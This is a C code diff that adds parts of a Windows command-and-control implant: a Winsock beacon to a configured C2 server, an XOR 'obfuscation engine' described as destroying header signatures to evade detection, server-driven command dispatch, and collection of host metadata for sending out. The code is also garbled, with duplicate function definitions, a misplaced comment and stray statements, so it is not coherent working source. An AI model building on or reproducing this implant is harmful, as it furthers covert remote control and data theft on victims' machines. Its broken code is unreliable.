@@ -4,6 +4,7 @@
 #include <ws2tcpip.h>
 #include <stdio.h>
 #include <string.h>
+#include <stddef.h>
 
 // Configuration for the MVP
 #define C2_SERVER      "127.0.0.1"
@@ -13,6 +14,203 @@
 #define BUFFER_SIZE    1024
 #define HOST_METADATA_SIZE 256
 #define HTTP_HEADER_SIZE   512
+#define RESPONSE_MAX_SIZE 4096
+
+
+// Declare the external functions so the compiler knows they exist
+void ApplyNetworkObfuscation(char* dataBuffer, size_t dataSize);
+void RouteIncomingCommand(const char* rawHttpResponse);
+int CollectHostMetadata(char *buffer, size_t bufferSize);
+
+
+// Global Outbound Data Queue
+char G_CommandResultQueue[1024] = { 0 };
+BOOL G_HasPendingResults = FALSE;
+
+// Function declarations matching earlier milestones
+int CollectHostMetadata(char* destinationPayload, size_t maxPayloadSize);
+
+void HandlePing(void) {
+    // Ping simply populates an acknowledgment message
+    snprintf(G_CommandResultQueue, sizeof(G_CommandResultQueue), "RESULT|PING_OK");
+    G_HasPendingResults = TRUE;
+    printf("[+] Ping handled. Output queued for next check-in.\n");
+}
+
+void HandleSysInfo(void) {
+    char metadata[256];
+    SecureZeroMemory(metadata, sizeof(metadata));
+    
+    // Collect live system statistics
+    CollectHostMetadata(metadata, sizeof(metadata));
+    
+    // Save the output directly into our transmission queue
+    snprintf(G_CommandResultQueue, sizeof(G_CommandResultQueue), "RESULT|%s", metadata);
+    G_HasPendingResults = TRUE;
+    
+    printf("[+] SysInfo handled. Data structured and queued for transmission.\n");
+}
+
+void HandleExit(void) {
+    printf("[!] Exiting agent process.\n");
+    ExitProcess(0);
+}
+
+/**
+ * Handles the complete TCP lifecycle: Connects, Obfuscates & Sends Payload,
+ * Receives Response, De-obfuscates, and hands data off to the parser.
+ */
+void EstablishWinsockChannel(const char* payloadData, size_t dataSize) {
+    WSADATA wsaData;
+    SOCKET connectSocket = INVALID_SOCKET;
+    struct sockaddr_in clientService;
+    int result;
+    
+    char receiveBuffer[RESPONSE_MAX_SIZE];
+    SecureZeroMemory(receiveBuffer, sizeof(receiveBuffer));
+
+    // 1. Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;
+
+    // 2. Create Socket
+    connectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (connectSocket == INVALID_SOCKET) {
+        WSACleanup();
+        return;
+    }
+
+    // 3. Configure Target
+    clientService.sin_family = AF_INET;
+    clientService.sin_port = htons(C2_PORT);
+    if (inet_pton(AF_INET, C2_SERVER, &clientService.sin_addr) <= 0) {
+        goto CLEANUP;
+    }
+
+    // 4. Connect
+    if (connect(connectSocket, (struct sockaddr*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
+        goto CLEANUP;
+    }
+
+    // 5. Obfuscate and Transmit outbound data
+    char* mutablePayload = (char*)payloadData;
+    ApplyNetworkObfuscation(mutablePayload, dataSize);
+    
+    send(connectSocket, mutablePayload, (int)dataSize, 0);
+
+    // 6. Read Incoming Response Stream (The C2 Server Tasking)
+    // This blocks until the server sends its HTTP response packet
+    int bytesReceived = recv(connectSocket, receiveBuffer, sizeof(receiveBuffer) - 1, 0);
+    if (bytesReceived > 0) {
+        receiveBuffer[bytesReceived] = '\0'; // Guarantee safety boundary
+
+        // Re-pass the incoming data through the XOR engine to drop the server's encryption layer
+        ApplyNetworkObfuscation(receiveBuffer, (size_t)bytesReceived);
+
+        // Send the plaintext HTTP response to the dispatch parser
+        RouteIncomingCommand(receiveBuffer);
+    }
+
+CLEANUP:
+    if (connectSocket != INVALID_SOCKET) closesocket(connectSocket);
+    WSACleanup();
+}
+
+
+// 1. Define a generic function pointer type for our commands
+typedef void (*CommandHandler)(void);
+
+// 2. Define the structure that pairs a text command with its executable function
+typedef struct {
+    const char* commandName;
+    CommandHandler handlerAction;
+} CommandEntry;
+
+// --- Define individual command handler functions ---
+
+void HandlePing(void) {
+    printf("[+] Action Executed: PING. Agent status is healthy.\n");
+}
+
+void HandleSysInfo(void) {
+    printf("[+] Action Executed: SYSINFO. Gathering host state...\n");
+    char metadata[256];
+    SecureZeroMemory(metadata, sizeof(metadata));
+    
+    // Calls the collection function we built previously
+    CollectHostMetadata(metadata, sizeof(metadata));
+    printf("    [Telemetry Result]: %s\n", metadata);
+}
+
+void HandleExit(void) {
+    printf("[!] Action Executed: EXIT. Terminating agent cleanly.\n");
+    // Centralized cleanup can be called here if necessary
+    ExitProcess(0);
+}
+
+// 3. Register all commands into the centralized Dispatch Table
+// The array length can grow infinitely as you add more functionality
+CommandEntry DispatchTable[] = {
+    { "CMD_PING",    HandlePing    },
+    { "CMD_SYSINFO", HandleSysInfo },
+    { "CMD_EXIT",    HandleExit    }
+};
+
+// Calculate the number of registered commands dynamically
+const size_t DispatchTableSize = sizeof(DispatchTable) / sizeof(CommandEntry);
+/**
+ * Parses a raw plaintext HTTP server response, extracts the body payload,
+ * and passes it to the Command Dispatch Table for routing.
+ */
+void RouteIncomingCommand(const char* rawHttpResponse) {
+    if (rawHttpResponse == NULL) return;
+
+    // 1. Locate the boundary double CRLF that marks the start of the HTTP body
+    const char* httpBody = strstr(rawHttpResponse, "\r\n\r\n");
+    if (!httpBody) {
+        printf("[-] Failed to parse server response: Invalid HTTP structure.\n");
+        return;
+    }
+    
+    // Advance the pointer by 4 bytes to pass completely through the "\r\n\r\n"
+    httpBody += 4; 
+    printf("[*] Extracted Server Command Token: '%s'\n", httpBody);
+
+    // 2. Query the Dispatch Table to route execution
+    BOOL commandFound = FALSE;
+    for (size_t i = 0; i < DispatchTableSize; i++) {
+        if (strcmp(httpBody, DispatchTable[i].commandName) == 0) {
+            // Execute the paired function dynamically via the function pointer
+            DispatchTable[i].handlerAction();
+            commandFound = TRUE;
+            break;
+        }
+    }
+
+    if (!commandFound) {
+        printf("[-] Received unknown or unrecognized command token from C2: %s\n", httpBody);
+    }
+}
+
+
+// A hardcoded multi-byte key (Keep this obfuscated in a real deployment)
+const char OBFUSCATION_KEY[] = { 0x4A, 0x76, 0x31, 0x2C, 0x5E, 0x09, 0x1F, 0x6B };
+const size_t KEY_LENGTH = sizeof(OBFUSCATION_KEY);
+
+/**
+ * In-place symmetric multi-byte XOR obfuscation engine.
+ * Passing the data through this function a second time completely restores it.
+ */
+void ApplyNetworkObfuscation(char* dataBuffer, size_t dataSize) {
+    if (dataBuffer == NULL || dataSize == 0) {
+        return;
+    }
+
+    for (size_t i = 0; i < dataSize; i++) {
+        // Apply the XOR mask using a rolling index bound to the key length
+        dataBuffer[i] ^= OBFUSCATION_KEY[i % KEY_LENGTH];
+    }
+}
+
 
 typedef enum _TRANSPORT_MODE {
     TRANSPORT_HTTP,
@@ -245,9 +443,22 @@ void PerformRawSocketPoll(void) {
         goto CLEANUP;
     }
 
+    // ... inside EstablishWinsockChannel() right before sending ...
+
+    printf("[*] Preparing data for transit. Original size: %d bytes.\n", payloadLength);
+
+    // Create a copy or obfuscate in-place if the buffer allows
+    // For this MVP, we will modify the local copy inside the transmission pipeline
+    char* mutablePayload = (char*)sendBuffer;
+
+    // 1. Morph the plaintext HTTP string into unreadable garbage bytes
+    ApplyNetworkObfuscation(mutablePayload, payloadLength);
+    printf("[*] Obfuscation engine applied. Header signatures destroyed.\n");
+
+int result = 0;
     while (bytesSent < payloadLength) {
-        int result = send(sock,
-                          sendBuffer + bytesSent,
+        result = send(sock,
+                          mutablePayload + bytesSent,
                           payloadLength - bytesSent,
                           0);
         if (result == SOCKET_ERROR) {
@@ -256,7 +467,7 @@ void PerformRawSocketPoll(void) {
         }
         bytesSent += result;
     }
-
+    printf("[+] Successfully transmitted %d obfuscated bytes.\n", result);
     bytesReceived = recv(sock, recvBuffer, sizeof(recvBuffer) - 1, 0);
     if (bytesReceived > 0) {
         recvBuffer[bytesReceived] = '\0';
